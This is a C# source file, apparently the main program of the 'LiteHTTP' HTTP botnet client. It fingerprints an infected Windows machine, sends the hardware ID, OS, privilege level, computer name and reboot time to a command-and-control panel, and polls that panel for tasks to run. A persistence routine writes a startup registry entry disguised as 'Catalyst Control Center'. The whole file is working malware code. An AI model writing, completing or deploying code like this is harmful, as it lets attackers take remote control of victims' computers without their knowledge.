using System;
using System.Text;
using Microsoft.Win32;
using System.Threading;
using LiteHTTP.Classes;

namespace LiteHTTP
{
    class Program
    {
        public static Thread s;
        static void Main(string[] args)
        {
            Thread x = new Thread(new ThreadStart(mainthread));
            x.Start();
            s = new Thread(new ThreadStart(startthread));
            //s.Start();
        }

        private static void mainthread()
        {
            string id = Identification.getHardwareID();
            do
            {
                string os = Identification.osName();
                string pv = null;
                if (Misc.isAdmin())
                {
                    pv = "Admin";
                }
                else
                {
                    pv = "User";
                }
                string ip = Misc.getLocation();
                string cn = new Microsoft.VisualBasic.Devices.Computer().Name;
                string lr = Misc.lastReboot();
                string par = "id=" + id + "&os=" + os + "&pv=" + pv + "&ip=" + ip + "&cn=" + cn + "&lr=" + lr + "&ct=" + Settings.ctask + "&bv=" + Settings.botv;
                string response = Communication.makeRequest(Settings.panelurl, par);
                if (response != "rqf")
                {
                    Console.WriteLine(response);
                    if (response.Contains("newtask"))
                    {
                        // process new task
                        string[] sps = response.Split(':');

                        string tid = sps[1];
                        if (tid != Settings.ctask)
                        {
                            Settings.ctask = tid;
                            if (Misc.processTask(sps[2], sps[3]))
                            {
                                // notify panel that task has completed
                                Communication.makeRequest(Settings.panelurl, par + "&op=1&td=" + tid);
                                if (Encoding.UTF8.GetString(Convert.FromBase64String(sps[2])) == "10" || Encoding.UTF8.GetString(Convert.FromBase64String(sps[2])) == "9")
                                {
                                    Communication.makeRequest(Settings.panelurl, par + "&uni=1");
                                    Environment.Exit(0);
                                }
                            }
                        }
                    }
                }
                Thread.Sleep(Settings.reqinterval * 60000); // reqinterval * 1000 = seconds, reqinterval * 60000 = minutes
            } while (true);
        }

        // adds the application to startup, with persistence
        private static void startthread()
        {
            do
            {
                // we wrap this in a try catch block to avoid errors with already existing keys / values
                try
                {
                    RegistryKey reg = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    reg.SetValue("Catalyst Control Center", "\"" + Misc.getLocation() + "\"", RegistryValueKind.String);
                }
                catch { } 
                Thread.Sleep(3000);
            } while (true);
        }
    }
}
